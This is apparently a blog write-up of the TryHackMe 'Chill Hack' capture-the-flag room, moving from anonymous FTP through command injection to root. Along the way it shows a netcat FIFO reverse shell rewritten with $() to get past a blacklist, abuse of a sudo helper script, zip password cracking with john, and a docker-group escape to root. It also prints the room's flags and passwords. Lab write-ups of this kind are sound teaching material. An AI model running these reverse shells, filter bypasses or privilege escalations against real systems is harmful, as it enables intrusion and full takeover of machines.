---
layout: post
title: Chill Hack
date: "2023-04-22 18:44:21 +0000"
categories: [CTF-WRITEUPS, TryHackMe - Chill Hack]
tags: [linux, tryhackme, web, privesc]
---

```yaml
room: https://tryhackme.com/room/chillhack
```

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png" width="100%"/>

In this room, there are no other instructions other than finding the `user flag` and the `root flag`

# Finding the user flag

## Enumeration

Let's start by enumerating open ports and services.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ nmap -sC -sV -Pn 10.10.98.178 -oN scan.txt
```

After few seconds, here is what we got back

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 14:54 EDT
Nmap scan report for 10.10.98.178
Host is up (0.060s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.104.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 09f95db918d0b23a822d6e768cc20144 (RSA)
|   256 1bcf3a498b1b20b02c6aa551a88f1e62 (ECDSA)
|_  256 3005cc52c66f6504860f7241c8a439cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.91 seconds
```

As you can notice, there are 3 open ports:

- ftp (21)
- ssh (22)
- http (80)

### FTP

Luckily, we don't need to put much effort into this, ftp allows anonymous connections, meaning everyone can access the server and retrieve data.

- user : anonymous
- password : (just leave it empty)

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ ftp 10.10.98.178
Connected to 10.10.98.178.
220 (vsFTPd 3.0.3)
Name (10.10.98.178:yariss): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15547|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp>
```

Okey, there is a note, let's retrive it

```bash
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||14215|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |*******************************************************************************************|    90      955.33 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (1.43 KiB/s)
```

Nice, now let's quit using `bye`, and `cat note.txt`.

```bash
ftp> bye
221 Goodbye.

┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Okey, what we can get from this message is that :

- two usernames : **anurodh** and **apaar**
- some potential command injection in their website?

We are done exploring FTP for the moment, let's move on to HTTP

### HTTP

Okey, let's open the website in the browser.

<img src="/../assets/chillhack_website.png" />

Seems like a normal website, before digging any deeper, let's first bruteforce files and directories.

I like a tool called `dirsearch`, it comes preinstalled if you got `kali` distribution.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ dirsearch -u http://10.10.98.178
```

Here are the results after running it for few seconds.

```bash
[15:09:18] 200 -   21KB - /about.html
[15:09:39] 200 -    0B  - /contact.php
[15:09:39] 200 -   18KB - /contact.html
[15:09:40] 301 -  310B  - /css  ->  http://10.10.98.178/css/
[15:09:46] 301 -  312B  - /fonts  ->  http://10.10.98.178/fonts/
[15:09:49] 301 -  313B  - /images  ->  http://10.10.98.178/images/
[15:09:49] 200 -   16KB - /images/
[15:09:50] 200 -   34KB - /index.html
[15:09:51] 200 -    3KB - /js/
[15:09:59] 200 -   19KB - /news.html
[15:10:09] 301 -  313B  - /secret  ->  http://10.10.98.178/secret/
[15:10:09] 200 -  168B  - /secret/
```

Something there is arousing my curiosity, its quite intriguing don't you agree ?

Yeah, what else would I be talking about other than the obvious `/secret` page. Let's explore it.

<img src="/../assets/chillhack_secret_page.png" />

## Gaining Access

### bypassing the filter

Interesting, so this is what the note's been about...

We could potentially be looking at some [command injection vulnerability](https://owasp.org/www-community/attacks/Command_Injection).

<img src="/../assets/chillhack_whoami.png" />

Hell yeah, the application is damn **vulnerable**, and we can exploit that to gain back a reverse shell.

Let's explore a bit more.

<img src="/../assets/chillhack_hacker.png" />

Hmmm, seems like there is a blacklist that blocks certain commands, like `ls`.

Roaming around and making a little bit of research, I have come across this : [bypassing filter with $()](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#bypass-with--1)

Basically, instead of using `ls`, we would use `l$()s`.

It has the same effect, but doesn't match the string in the blacklist.

<img src="/../assets/chillhack_ls.png" />

BOOM, it worked. Now all we have got to do is get a reverse shell !

### getting a reverse shell

Basically, how it works is we (as the attacker) are going to listen for incoming connections at a certain port.

And since the application is vulnerable to command injection, we could use the input as a gate to connect to ourselves, providing an interactive shell.

Let's grab a reverse shell command from [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and modify it to bypass the filtering.

You would usually use netcat , chaining it with '-e' to provide the `shell`, but `-e` can sometimes be unsupported.

We can overcome this by opening a `fifo pipe` which will basically be our gateway to make `inter process communication`

You can read more about it [here](https://www.tutorialspoint.com/inter_process_communication/inter_process_communication_named_pipes.htm)

Or you can just grab the command from [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), but it doesn't hurt to know how this works.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Let's modify it to fit our needs.

- adding $() to each command
- changing the ip address to point to our machine :
  - type `ip a` , then locate `tun0` interface, and copy the ip address

```bash
r$()m /tmp/f;mk$()fifo /tmp/f;c$()at /tmp/f|/bin/sh -i 2>&1|n$()c 10.8.104.101 1234 >/tmp/f
```

Now, before executing the command, we need to start listening at port 1234, remember?

```bash
──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
```

After executing our payload, we've got a shell !!!

```bash
listening on [any] 1234 ...
connect to [10.8.104.101] from (UNKNOWN) [10.10.98.178] 51092
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

But it's not that stable, let's stabilize it a little using python.

```bash
$ python --version
/bin/sh: 2: python: not found
$ python3 --version
Python 3.6.9
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/secret$ whoami
whoami
www-data
www-data@ubuntu:/var/www/html/secret$
```

Much better, now let's begin exploring !

### privilege escalation

Now that we are inside the machine, let's explore it a little.

The first thing i like to test before jumping to anything else is `sudo -l`, it is nothing fancy but challenges can sometimes be fishy, you'll never know !

```bash
www-data@ubuntu:/var/www/files/images$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

See ? we can run the script `/home/apaar/.helpline.sh` as `apaar`.

Now do you remember that user? it is the one who wrote that note.

Let's go ahead and see what that script does.

```bash
www-data@ubuntu:/var/www/files/images$ cd /home/apaar
cd /home/apaar
www-data@ubuntu:/home/apaar$ ls -lhisa
ls -lhisa
total 44K
655374 4.0K drwxr-xr-x 5 apaar apaar 4.0K Oct  4  2020 .
655361 4.0K drwxr-xr-x 5 root  root  4.0K Oct  3  2020 ..
655391    0 -rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
655375 4.0K -rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
655376 4.0K -rw-r--r-- 1 apaar apaar 3.7K Oct  3  2020 .bashrc
655389 4.0K drwx------ 2 apaar apaar 4.0K Oct  3  2020 .cache
655387 4.0K drwx------ 3 apaar apaar 4.0K Oct  3  2020 .gnupg
655380 4.0K -rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
655377 4.0K -rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
655385 4.0K drwxr-xr-x 2 apaar apaar 4.0K Oct  3  2020 .ssh
655381 4.0K -rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
655378 4.0K -rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt

```

Seems like there is a file `local.txt` that we can not read, maybe it has the `user flag` ?.

```bash
www-data@ubuntu:/home/apaar$ cat .helpline.sh
cat .helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

Interesting, it seems like we can just provide a command like `bash` to gain a shell as `apaar`.

```bash
www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with:

Hello user! I am ,  Please enter your message: bash
bash
ls
ls
local.txt
whoami
whoami
apaar
cat local.txt
cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

```javascript
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

# Finding the root flag

Let's now get back to `/var/www/html` where the website is hosted, see if we can find anything cheesy.

```bash
about.html    contact.php  images      news.html    single-blog.html
blog.html     css          index.html  preview_img  style.css
contact.html  fonts        js          secret       team.html
www-data@ubuntu:/var/www/html$
```

After exploring a little, nothing seems interesting. Let's dig deeper...

```bash
www-data@ubuntu:/var/www/html$ cd ..
cd ..
www-data@ubuntu:/var/www$ ls
ls
files  html
```

Hmmm, additional directory other than html ! Now that's odd a little, let's see what that holds for us.

```bash
www-data@ubuntu:/var/www$ cd files
cd files
www-data@ubuntu:/var/www/files$ ls -lhisa
ls -lhisa
total 28K
 530143 4.0K drwxr-xr-x 3 root root 4.0K Oct  3  2020 .
1050401 4.0K drwxr-xr-x 4 root root 4.0K Oct  3  2020 ..
 530145 4.0K -rw-r--r-- 1 root root  391 Oct  3  2020 account.php
 530146 4.0K -rw-r--r-- 1 root root  453 Oct  3  2020 hacker.php
 530144 4.0K drwxr-xr-x 2 root root 4.0K Oct  3  2020 images
 530147 4.0K -rw-r--r-- 1 root root 1.2K Oct  3  2020 index.php
 530150 4.0K -rw-r--r-- 1 root root  545 Oct  3  2020 style.css
```

`hacker.php` ? that's an attractive filename, after reading its content, it seems like we are close to something biggg.

The content also has some sort of an image, which is located inside `./images` , let's try to get the image.

In my machine, let's setup a listener that will get a file and stores it as 'hackerimg.jpg'

```bash
┌──(yariss㉿Kali-VM)-[~]
└─$ nc -nlvp 1337 > hackerimg.jpg
```

In the victime's machine , we are going to transfer the img using netcat.

```bash
www-data@ubuntu:/var/www/files/images$ ls
ls
002d7e638fb463fb7a266f5ffc7ac47d.gif  hacker-with-laptop_23-2147985341.jpg
www-data@ubuntu:/var/www/files/images$ nc 10.8.104.101 1337 < hacker-with-laptop_23-2147985341.jpg
```

We got it !

<img src="/../assets/chillhack_shush.png" />

Maybe the image holds some metadata inside it, we can extract that data using `steghide`.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ steghide extract -sf hackerimg.jpg
Enter passphrase:
wrote extracted data to "backup.zip".
```

We got lucky, the passphrase was just '' (empty). If that wasn't the case, we could have used `stegseek` to bruteforce it.

Let's unzip `backup.zip`

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password:
   skipping: source_code.php         incorrect password
```

Hmm, seems like it needs a password, time for Mr.John !

First, we need to process the zip file in a format that john recognizes.

`zip2john` processes input ZIP files into a format suitable for use with JtR

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ zip2john backup.zip > jhonny
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
```

Now we can use john to crack the password.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ john jhonny --wordlist=/usr/share/wordlists/rockyou.txt
```

Yeaaah, we've got it

> _pw : pass1word_

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ john jhonny --show
backup.zip/source_code.php:pass1word:source_code.php:backup.zip::backup.zip
1 password hash cracked, 0 left
```

Now let's unzip the backup folder

```bash
──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password:
  inflating: source_code.php
```

We got some sort of php source code. Reading its content got me this encoded password `IWQwbnRLbjB3bVlwQHNzdzByZA==`.

It is a **base64** string, let's decode it.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
!d0ntKn0wmYp@ssw0rd
```

We got some sort of a password, but who's password is this?

Remember earlier, there was 2 users communicating in that `note.txt`. Maybe the password belongs to one of them...

And since we've already got the user's flag, it is not far that password is for the other user `anurodh`.
Let's test that out.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes/Chill the Hack]
└─$ ssh anurodh@10.10.13.242
```

And we are in !!!

```bash
anurodh@ubuntu:/home$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

We are in the `docker` groupe !!

I didn't even need to do anything and I can already tell that we can root the machine.

```bash
anurodh@ubuntu:/home$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              a24bb4013296        2 years ago         5.57MB
hello-world         latest              bf756fb1ae65        3 years ago         13.3kB
anurodh@ubuntu:/home$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
anurodh@ubuntu:/home$
```

We have got `alpine` as a docker image.

Now what we can do is :

- run a container based on that image
- mount the root directory of our filesystem to /mnt of the container.
- change the root directory of the container to /mnt , This allows the container to access the files and directories on the host machine that are located in the root directory /, which are now visible inside the container as if they were located at the root directory /mnt.
- start an interactive shell

You can find the command in gtfobins [here](https://gtfobins.github.io/gtfobins/docker/)

Let's execute it !

```bash
anurodh@ubuntu:/home$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# whoami
root
#
```

BOOM, let's read the root flag.

```bash
# cd /root
# ls
proof.txt
# cat proof.txt
```

```javascript
 {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

The machine has been successfully owned 😃

I hope you enjoyed the write up
